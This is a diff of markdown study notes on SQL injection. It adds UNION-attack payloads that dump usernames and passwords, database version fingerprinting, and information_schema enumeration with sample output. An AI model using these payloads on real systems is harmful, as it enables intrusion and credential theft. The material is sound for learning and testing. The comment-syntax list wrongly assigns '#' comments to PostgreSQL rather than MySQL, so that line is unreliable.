@@ -31,10 +31,6 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/hugeSQL.txt -d "username=a
 - [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
 - [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
 
-### Examining the database
-
-
-
 ### UNION Attacks
 
 For `UNION` query to work, two key requirements must be met:
@@ -87,7 +83,69 @@ If the column data type is not compatible with string data, the injected query w
 
 #### Retrieving interesting data
 
-#### Retrieving multiple values in a single column
+When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data. 
+
+After determining the name of the table you would like to dump information from, you are able to retrieve the data stored in the database:
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+#### Retrieve multiple values within a single column
+
+In some cases the query in the previous example may only return a single column.
+You can retrieve multiple values together within this single column by concatenating the values together. 
+
+```
+-- Oracle
+' UNION SELECT username || '~' || password FROM users--
+
+-- MySQL
+' UNION SELECT null,concat(username,'~',password) FROM users--
+```
+
+#### Examining the Database
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works.
+
+- Microsoft SQL : `SELECT @@version`
+- Oracle : `SELECT * FROM v$version`
+- PostgreSQL : `SELECT version()`
+
+For example, you could use a `UNION` attack with teh following input: `' UNION SELECT @@version--`
+When attempting to determine the type of database you are dealing with, don't forget to change the syntax of the comments as well:
+
+- Oracle : `--comment`
+- Microsoft `--comment`, `/*comment*/`
+- PostgreSQL: `--comment`, `/*comment*/`, `#comment`
+- MySQL: `-- comment`, `/*comment*/`
+
+#### Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database. For example, you can query `information_schema.tables` to list the tables in the database: `SELECT * FROM information_schema.tables`
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+You can then query `information_schema.columns` to list the columns in individual tables: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
 
 #### Guides
 - [Union Based Oracle Injection](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)
